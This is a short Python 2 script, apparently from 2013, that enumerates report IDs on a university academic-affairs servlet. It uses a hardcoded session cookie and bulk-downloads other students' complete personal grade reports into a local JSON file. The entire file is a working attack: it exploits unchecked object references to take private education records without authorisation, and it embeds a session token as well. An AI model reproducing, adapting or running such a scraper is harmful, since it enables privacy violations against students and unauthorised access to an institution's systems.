#-*- coding=utf-8 -*-
'''
  author: atupal
  2013.7.21
'''
import requests, time, re
import threading
from Queue import Queue
import json
from random import randint as rand


score_set = dict()
dictlock = threading.Lock()
id_set = set()

def download(ID):

  url = ('http://bksjw.hust.edu.cn/reportServlet?action=18&file=student_personal_score_all' +
  '.raq&srcType=file&separator=%09&reportParamsId=' + str(ID)
      + '&saveAsName=&cachedId=A_5%d&t_i_m_e=%d' % (rand(300, 600), time.time() * 1000) )

  headers = {
      'cookie': 'usertype=xs; hub_service=Fjde1oXdvHjTn3JXXgIw+dpmaj1+eZxJvJXv6KIko0d/eb+2Y/Gq0P8D/T3aNoN9thW1eh7A7mtj0g==; JSESSIONID=0000Z6YRuKLmWMoaZ4xaKV2i-ma:166nc7rnq'
      }

  resp = requests.get(url, headers = headers)
  if resp.status_code != 200:
    print 'watting 1 min'
    time.sleep(60)
  if '201110090' not in resp.content and 'script' not in resp.content:
    pat = r'''U([0-9]{9,9})'''
    ret = re.findall(pat, resp.content)
    if len(ret) > 0 and str(ret[0]) not in id_set and str(ret[0]) not in score_set:
      print '\033[31mget %s' % (ret[0])
      score_set[ ret[0] ] = resp.content.decode('gbk')


def update_id():
  with open('./score.json', 'r') as fi:
    score = json.loads("["  +  fi.read().strip().strip(',').strip('\n').strip(',')  +  "]" )
    for s in score:
      for ss in s:
        id_set.add(str(ss))

    print 'crawler count: %d' % len(id_set)

update_id()


class Crawler(threading.Thread):
  def __init__(self, queue):
    threading.Thread.__init__(self)
    self.queue = queue

  def run(self):
    while 1:
      ID = queue.get()
      try:
        time.sleep(0.1)
        download(ID)
        if len(score_set) > 5:
          dictlock.acquire()
          try:
            with open('./score.json', 'aw') as fi:
              fi.write(",\n\n" + json.dumps(score_set, indent = 2))
              fi.flush()
              score_set.clear()
          finally:
            update_id()
            dictlock.release()
      except Exception as e:
        self.queue.put(ID)
        if 'HTTPConnectionPool' in str(e):
          print 'waiting 1 min'
          time.sleep(60)
        else:
          print e
      finally:
        self.queue.task_done()


if __name__ == "__main__":
  queue = Queue()
  for  i in xrange(1, 90000, 1):
    queue.put(103608 + i)
    queue.put(103608 - i)


  for i in xrange(5):
    crawler = Crawler(queue)
    crawler.start()

  print 'begin crawler!'
  queue.join()
